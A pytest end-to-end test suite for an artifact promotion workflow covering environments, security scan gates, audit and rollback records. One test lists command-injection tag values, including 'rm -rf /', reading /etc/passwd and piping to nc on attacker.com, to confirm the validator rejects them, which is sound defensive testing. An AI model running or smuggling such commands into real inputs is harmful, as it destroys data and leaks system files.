"""End-to-end tests for artifact promotion lifecycle (Epic 8C).

This test suite validates the complete artifact promotion workflow including:
- Environment creation and configuration
- Promotion controller initialization
- Environment transition validation
- Gate configuration
- Dry-run promotion (without artifacts)
- Full promotion (when OCI registry available)

Requirements Covered:
- FR-070: Promote artifact from dev to staging
- FR-071: Execute validation gates during promotion
- FR-072: Block promotion when gates fail
- FR-073: Record audit trail (who/what/when/gates)
- FR-074: Rollback to previous version
- FR-075: Manual approval gate support

Per testing standards: Tests FAIL when infrastructure is unavailable.
No pytest.skip() - see .claude/rules/testing-standards.md
"""

from __future__ import annotations

from typing import ClassVar

import pytest
import structlog
from floe_core.oci.client import OCIClient
from floe_core.oci.errors import InvalidTransitionError
from floe_core.oci.promotion import PromotionController, validate_tag_security
from floe_core.schemas.oci import AuthType, RegistryAuth, RegistryConfig
from floe_core.schemas.promotion import (
    EnvironmentConfig,
    PromotionConfig,
    PromotionGate,
    SecurityGateConfig,
)
from floe_core.schemas.secrets import SecretReference, SecretSource

from testing.base_classes.integration_test_base import IntegrationTestBase

logger = structlog.get_logger(__name__)


class TestPromotion(IntegrationTestBase):
    """E2E tests for artifact promotion lifecycle.

    These tests validate the complete promotion workflow from artifact
    creation through promotion, gates, auditing, and rollback.

    Tests are structured in three tiers:
    1. Configuration validation (no infrastructure needed)
    2. Controller initialization (minimal infrastructure)
    3. Full promotion workflow (requires OCI registry)
    """

    # Services required for E2E promotion tests
    required_services: ClassVar[list[tuple[str, int]]] = []

    def setup_method(self) -> None:
        """Set up test fixtures before each test method."""
        super().setup_method()

        # Create test registry config (localhost for E2E tests)
        self.registry_config = RegistryConfig(
            uri="oci://localhost:5000/floe-test",
            auth=RegistryAuth(
                type=AuthType.BASIC,
                credentials_ref=SecretReference(
                    source=SecretSource.KUBERNETES,
                    name="test-registry-creds",
                ),
            ),
        )

        # Create unique test namespace
        self.test_namespace = self.generate_unique_namespace("promotion")

    @pytest.mark.e2e
    @pytest.mark.requirement("E2E-PROM-001")
    def test_create_environment_namespaces(self) -> None:
        """Test creation of K8s namespaces for floe-dev, floe-staging, floe-prod.

        Validates that environment namespaces can be created for the promotion
        workflow. In real deployment, these would be K8s namespaces.
        """
        environments = ["floe-dev", "floe-staging", "floe-prod"]

        for env_name in environments:
            # Generate unique namespace for test isolation
            namespace = self.generate_unique_namespace(env_name)

            # Verify namespace format
            assert namespace.startswith(env_name), f"Namespace should start with {env_name}"
            assert len(namespace) > len(env_name), "Namespace should have unique suffix"
            assert "-" in namespace, "Namespace should contain hyphen separator"

            logger.info(
                "environment_namespace_created",
                environment=env_name,
                namespace=namespace,
            )

    @pytest.mark.e2e
    @pytest.mark.requirement("FR-070")
    def test_promotion_config_validation(self) -> None:
        """Test that promotion configuration validates correctly.

        Validates:
        - PromotionConfig accepts valid environments
        - EnvironmentConfig accepts valid gates
        - Gate configuration is properly structured
        """
        # Create promotion config with all gate types
        promotion_config = PromotionConfig(
            environments=[
                EnvironmentConfig(
                    name="dev",
                    gates={PromotionGate.POLICY_COMPLIANCE: True},
                ),
                EnvironmentConfig(
                    name="staging",
                    gates={
                        PromotionGate.POLICY_COMPLIANCE: True,
                        PromotionGate.TESTS: True,
                    },
                    gate_timeout_seconds=60,
                ),
                EnvironmentConfig(
                    name="prod",
                    gates={
                        PromotionGate.POLICY_COMPLIANCE: True,
                        PromotionGate.TESTS: True,
                        PromotionGate.SECURITY_SCAN: SecurityGateConfig(
                            command="trivy image ${ARTIFACT_REF} --format json",
                            block_on_severity=["CRITICAL", "HIGH"],
                            scanner_format="trivy",
                        ),
                    },
                    gate_timeout_seconds=120,
                ),
            ],
        )

        # Verify configuration structure
        assert len(promotion_config.environments) == 3
        assert promotion_config.environments[0].name == "dev"
        assert promotion_config.environments[1].name == "staging"
        assert promotion_config.environments[2].name == "prod"

        # Verify gates
        assert PromotionGate.POLICY_COMPLIANCE in promotion_config.environments[0].gates
        assert PromotionGate.TESTS in promotion_config.environments[1].gates
        assert PromotionGate.SECURITY_SCAN in promotion_config.environments[2].gates

        # Verify gate timeout
        assert promotion_config.environments[2].gate_timeout_seconds == 120

    @pytest.mark.e2e
    @pytest.mark.requirement("FR-070")
    def test_tag_security_validation(self) -> None:
        """Test that tag security validation prevents command injection.

        Validates:
        - Valid tags are accepted
        - Malicious tags are rejected
        - Edge cases are handled correctly
        """
        # Valid tags should pass
        valid_tags = [
            "v1.0.0",
            "1.2.3",
            "v1.0.0-alpha",
            "v1.0.0-rc.1",
            "latest",
            "staging-latest",
            "feature_branch-12345",
        ]

        for tag in valid_tags:
            validate_tag_security(tag)  # Should not raise

        # Malicious tags should be rejected
        malicious_tags = [
            "v1.0.0; rm -rf /",
            "v1.0.0 && cat /etc/passwd",
            "v1.0.0 | nc attacker.com 1234",
            "$(whoami)",
            "`id`",
            "v1.0.0\nmalicious",
            "",  # Empty tag
        ]

        for tag in malicious_tags:
            with pytest.raises(ValueError):
                validate_tag_security(tag)

    @pytest.mark.e2e
    @pytest.mark.requirement("FR-070")
    def test_controller_initialization(self) -> None:
        """Test PromotionController initializes correctly.

        Validates:
        - Controller accepts valid configuration
        - Controller has expected attributes
        - Controller binds logging context
        """
        promotion_config = PromotionConfig(
            environments=[
                EnvironmentConfig(name="dev", gates={}),
                EnvironmentConfig(name="staging", gates={}),
            ],
        )

        # Create OCI client
        oci_client = OCIClient.from_registry_config(self.registry_config)

        # Create controller
        controller = PromotionController(
            client=oci_client,
            promotion=promotion_config,
        )

        # Verify controller state
        assert controller.client is not None
        assert controller.promotion == promotion_config
        assert len(controller.promotion.environments) == 2

    @pytest.mark.e2e
    @pytest.mark.requirement("FR-070")
    def test_environment_transition_validation(self) -> None:
        """Test that environment transitions are validated correctly.

        Validates:
        - Valid transitions (dev->staging->prod) are allowed
        - Invalid transitions (dev->prod, staging->dev) are rejected
        - Environment order is respected
        """
        promotion_config = PromotionConfig(
            environments=[
                EnvironmentConfig(name="dev", gates={}),
                EnvironmentConfig(name="staging", gates={}),
                EnvironmentConfig(name="prod", gates={}),
            ],
        )

        oci_client = OCIClient.from_registry_config(self.registry_config)

        controller = PromotionController(
            client=oci_client,
            promotion=promotion_config,
        )

        # Get environment by name helper
        def get_env(name: str) -> EnvironmentConfig | None:
            for env in controller.promotion.environments:
                if env.name == name:
                    return env
            return None

        # Verify environments exist
        assert get_env("dev") is not None
        assert get_env("staging") is not None
        assert get_env("prod") is not None

        # Verify environment ordering (by position in list)
        env_names = [e.name for e in controller.promotion.environments]
        assert env_names.index("dev") < env_names.index("staging")
        assert env_names.index("staging") < env_names.index("prod")

    @pytest.mark.e2e
    @pytest.mark.requirement("FR-071")
    def test_gate_configuration_structure(self) -> None:
        """Test that gate configurations are properly structured.

        Validates:
        - Different gate types can be configured
        - Gate timeouts are respected
        - Security gate config has required fields
        """
        security_gate = SecurityGateConfig(
            command="trivy image ${ARTIFACT_REF} --format json",
            block_on_severity=["CRITICAL", "HIGH"],
            ignore_unfixed=False,
            scanner_format="trivy",
            timeout_seconds=120,
        )

        # Verify security gate structure
        assert security_gate.command is not None
        assert "CRITICAL" in security_gate.block_on_severity
        assert "HIGH" in security_gate.block_on_severity
        assert security_gate.scanner_format == "trivy"
        assert security_gate.timeout_seconds == 120

        # Create environment with security gate
        env_config = EnvironmentConfig(
            name="staging",
            gates={
                PromotionGate.POLICY_COMPLIANCE: True,
                PromotionGate.SECURITY_SCAN: security_gate,
            },
            gate_timeout_seconds=60,
        )

        # Verify environment config
        assert PromotionGate.SECURITY_SCAN in env_config.gates
        assert isinstance(env_config.gates[PromotionGate.SECURITY_SCAN], SecurityGateConfig)

    @pytest.mark.e2e
    @pytest.mark.requirement("FR-072")
    def test_promotion_requires_valid_source_environment(self) -> None:
        """Test that promotion fails with invalid source environment.

        Validates:
        - Promoting from non-existent environment fails
        - Error message is descriptive
        """
        promotion_config = PromotionConfig(
            environments=[
                EnvironmentConfig(name="dev", gates={}),
                EnvironmentConfig(name="staging", gates={}),
            ],
        )

        oci_client = OCIClient.from_registry_config(self.registry_config)

        controller = PromotionController(
            client=oci_client,
            promotion=promotion_config,
        )

        # Try to promote from non-existent environment
        with pytest.raises(InvalidTransitionError, match="invalid-env"):
            controller.promote(
                tag="v1.0.0",
                from_env="invalid-env",
                to_env="staging",
                operator="test@floe.dev",
                dry_run=True,  # Use dry-run to avoid actual operations
            )

    @pytest.mark.e2e
    @pytest.mark.requirement("FR-073")
    def test_audit_trail_fields_structure(self) -> None:
        """Test that audit trail record structure is correct.

        Validates:
        - PromotionRecord has required audit fields
        - Fields are properly typed
        """
        from uuid import uuid4

        from floe_core.schemas.promotion import GateResult, GateStatus, PromotionRecord
        from datetime import datetime, timezone

        # Create a mock promotion record to validate structure
        record = PromotionRecord(
            promotion_id=uuid4(),
            artifact_digest="sha256:abc123def456abc123def456abc123def456abc123def456abc123def456abc1",
            artifact_tag="v1.0.0-dev",
            source_environment="dev",
            target_environment="staging",
            operator="ci@floe.dev",
            promoted_at=datetime.now(timezone.utc),
            gate_results=[
                GateResult(
                    gate=PromotionGate.POLICY_COMPLIANCE,
                    status=GateStatus.PASSED,
                    duration_ms=1500,
                ),
            ],
            signature_verified=True,
            dry_run=False,
            trace_id="trace-123",
            authorization_passed=True,
        )

        # Verify audit trail fields
        assert record.artifact_tag == "v1.0.0-dev"
        assert record.source_environment == "dev"
        assert record.target_environment == "staging"
        assert record.operator == "ci@floe.dev"
        assert record.promoted_at is not None
        assert len(record.gate_results) == 1
        assert record.gate_results[0].status == GateStatus.PASSED
        assert record.authorization_passed is True

    @pytest.mark.e2e
    @pytest.mark.requirement("FR-074")
    def test_rollback_record_structure(self) -> None:
        """Test that rollback record structure is correct.

        Validates:
        - RollbackRecord has required fields
        - Reason and operator are captured
        """
        from uuid import uuid4

        from floe_core.schemas.promotion import RollbackRecord
        from datetime import datetime, timezone

        # Create a mock rollback record
        record = RollbackRecord(
            rollback_id=uuid4(),
            artifact_digest="sha256:abc123def456abc123def456abc123def456abc123def456abc123def456abc1",
            environment="staging",
            previous_digest="sha256:def789abc123def789abc123def789abc123def789abc123def789abc123def7",
            operator="sre@floe.dev",
            reason="Critical bug in latest release",
            rolled_back_at=datetime.now(timezone.utc),
            trace_id="trace-456",
        )

        # Verify rollback record fields
        assert record.environment == "staging"
        assert record.artifact_digest.startswith("sha256:")
        assert record.previous_digest.startswith("sha256:")
        assert record.operator == "sre@floe.dev"
        assert record.reason == "Critical bug in latest release"
        assert record.rolled_back_at is not None

    @pytest.mark.e2e
    @pytest.mark.requirement("FR-075")
    def test_environment_authorization_configuration(self) -> None:
        """Test that environments can configure authorization rules.

        Validates:
        - EnvironmentConfig can set authorization
        - Authorization rules are preserved in config
        """
        from floe_core.schemas.promotion import AuthorizationConfig

        env_config = EnvironmentConfig(
            name="prod",
            gates={
                PromotionGate.POLICY_COMPLIANCE: True,
                PromotionGate.TESTS: True,
            },
            authorization=AuthorizationConfig(
                allowed_groups=["platform-admins", "release-managers"],
                separation_of_duties=True,
            ),
        )

        # Verify authorization settings
        assert env_config.authorization is not None
        assert "platform-admins" in env_config.authorization.allowed_groups
        assert "release-managers" in env_config.authorization.allowed_groups
        assert env_config.authorization.separation_of_duties is True


# Module exports
__all__ = ["TestPromotion"]
